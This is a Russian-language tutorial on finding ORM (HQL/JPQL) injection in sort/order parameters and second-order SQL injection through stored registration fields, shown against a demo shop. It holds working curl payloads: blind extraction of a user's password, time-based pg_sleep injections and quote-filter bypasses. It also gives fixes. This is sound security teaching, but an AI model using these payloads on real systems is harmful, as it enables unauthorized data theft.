## Задача

Базовые инъекции мы умеем искать. Но два класса легко пропустить: **инъекция через ORM** (когда кажется, что «ORM защищает от SQLi») и **second-order** (когда payload безвреден в момент отправки, а срабатывает позже, в другом запросе).

Разберём оба на одном приложении.

## Наш пример: список товаров с сортировкой

Магазин отдаёт товары через ORM (Hibernate/JPA). Параметры `sort` и `order` выглядят безопасно:

```bash
$ curl -s 'https://shop.local/api/products?sort=price&order=asc' | jq '.[0].name'
"Чайник"
```

Но попробуем сломать `sort` — ведь имя колонки в SQL нельзя передать параметром, его часто **вклеивают напрямую**:

```bash
$ curl -s 'https://shop.local/api/products?sort=price,case when 1=1 then 1 else 1/0 end&order=asc' -o /dev/null -w '%{http_code}\n'
500
```

500 — запрос упал. Значит, наше выражение попало в HQL/SQL как есть. Это **ORM-инъекция**: ORM не защищает, если строку собирают конкатенацией.

## Шаг 1: HQL/JPQL — инъекция в язык объектов

ORM-запрос (HQL/JPQL) похож на SQL, но работает с классами и полями. Уязвимый код выглядит так:

```java
String q = "from Product order by " + sort + " " + order;
```

Вставляем подзапрос, чтобы вытащить данные через ошибку или время:

```bash
$ curl -s 'https://shop.local/api/products?sort=(select+case+when+(substring((select+password+from+users+where+id=1),1,1)=%27a%27)+then+1+else+1/0+end)&order=asc'
```

`1/0` даёт ошибку при ложном условии, `1` — при истинном. Мы получили **boolean-based blind** через ORM. То же работает и в `order`, и в именах полей — там, где параметризация невозможна.

## Шаг 2: как искать ORM-инъекции

- **Параметры-идентификаторы:** `sort`, `order`, `column`, `field`, `group` — их нельзя параметризовать, поэтому вклеивают.
- **Ошибки:** сломай параметр (`sort=1'`, `sort=foo`) и смотри, меняется ли код/текст ошибки.
- **Разница:** сравни ответ для `sort=id` и `sort=(case...)` — различие подтверждает инъекцию.
- **Стек:** ORM-ошибки содержат имена сущностей (`Product`, `Order`) — по ним видно, что это HQL/JPQL.

## Шаг 3: second-order — отложенное исполнение

Второй класс сложнее: payload сохраняется «безопасно», а срабатывает потом. Зарегистрируемся с логином, содержащим кавычку:

```bash
$ curl -s -d "user=alice'--&pass=x" https://shop.local/register
{"status":"ok"}
```

Сейчас ничего не сломалось — имя сохранилось в базу как строка. Но когда сервер построит запрос из этого имени, инъекция сработает:

```bash
$ curl -s -b c.txt https://shop.local/profile/update
# сервер выполняет: UPDATE logs SET note='alice'--' WHERE ...
# хвост запроса закомментирован -> меняется логика
{"status":"ok","rows":3}
```

`rows:3` — обновилось три строки вместо одной. Это **second-order SQLi**: вход чистый на входе, грязный на выходе.

## Шаг 4: где искать second-order

- **Регистрация/профиль:** имя, email, ник сохраняются и потом подставляются в другие запросы.
- **Логи и аудит:** запись события, затем построение отчёта из логов.
- **Импорт/экспорт:** CSV/JSON загружают данные, потом их же обрабатывают.
- **Смена пароля:** сохранённое значение подставляется в `UPDATE`.

Проверка: подставь безобидный маркер (`test'`) во все «складские» поля, а потом пройдись по функциям, которые эти поля читают, и следи за ошибками.

## Шаг 5: почему это пропускают

Сканеры видят запрос в момент отправки и не находят инъекцию (там всё экранировано). Срабатывание — в **другом** запросе, часто в другом эндпоинте. Поэтому second-order ищут вручную, «прошивая» маркер через всю систему и наблюдая отложенный эффект.

## Если не сработало

- **ORM параметризует всё** — ищи `order by`/`group by` через `CASE` или подзапрос; иногда инъекция только в `order`.
- **Second-order не виден** — используй time-based (`pg_sleep`, `WAITFOR DELAY`) в сохранённом значении.
- **Фильтр на кавычку** — кодируй (`%27`), используй `CHAR()`, или другую кодировку (`GBK`-байпас).
- **Слепая зона** — задействуй OOB (DNS/HTTP callback) в подзапросе.

## Что мы теперь знаем

- ORM не защищает, если запрос собирают конкатенацией (особенно `order by`/`sort`).
- HQL/JPQL-инъекция ищется по параметрам-идентификаторам и различию в ответах.
- Second-order срабатывает отложенно: чистый вход, грязный выход.
- Оба класса плохо ловятся сканерами — нужен ручной «прошивающий» тест.

## Частые вопросы

**Разве ORM не защищает от SQLi?** Защищает только при **параметризации**. Имена таблиц/колонок и `order by` параметризовать нельзя — их вклеивают, и там появляется инъекция.

**Почему second-order так сложно найти?** Потому что инъекция срабатывает не там, где отправлена. Сканер видит экранированный ввод и молчит. Нужен ручной «прошивающий» тест.

**Как обнаружить second-order вручную?** Подставь маркер (`test'`) во все «складские» поля, затем пройдись по функциям, которые их читают, и следи за ошибками/задержкой.

**Чем HQL отличается от SQL для атакующего?** Синтаксис похож, но работают с сущностями и полями. `UNION` может не подойти — используй подзапросы и `CASE`.

**Что если вывод есть?** Тогда second-order можно эксплуатировать напрямую: подставь `UNION SELECT` в сохранённое значение и прочитай данные на странице, которая его использует.

**Как исправить?** Параметризация везде, где возможно; для идентификаторов — белый список допустимых значений, а не конкатенация.

## Ещё один сценарий: second-order в смене e-mail

Проследим second-order до конца. Регистрируемся с «грязным» e-mail:

```bash
$ curl -s -d "email=attacker'||(SELECT pg_sleep(5))||'@x.com&pass=p" https://shop.local/register
{"status":"ok"}
```

Сейчас запрос прошёл быстро (значение просто сохранено). А теперь запрашиваем список пользователей — сервер строит запрос из сохранённого e-mail:

```bash
$ time curl -s -b admin.txt https://shop.local/admin/users
real 0m5.2s
```

Пять секунд задержки — **сработала отложенная инъекция**. Тот же приём даёт boolean-blind: вместо `pg_sleep` подставь условие с `CASE`.

```bash
$ curl -s -d "email=x'||(SELECT CASE WHEN (1=1) THEN 1 ELSE 1/0 END)||'@x.com" https://shop.local/register
```

## На что смотреть дальше

- **Идентификаторы.** `sort`, `order`, `column`, `field` — ORM-инъекция.
- **Складские поля.** Имя, e-mail, ник, комментарий — для second-order.
- **Читатели.** Найди функции, которые **используют** сохранённые значения.
- **Time-based.** `pg_sleep`, `WAITFOR DELAY`, `SLEEP` — универсальный детектор.
- **Кодировки.** `%27`, `CHAR()`, GBK-байпас при фильтре кавычек.
- **Исправление.** Параметризация + белый список для идентификаторов.
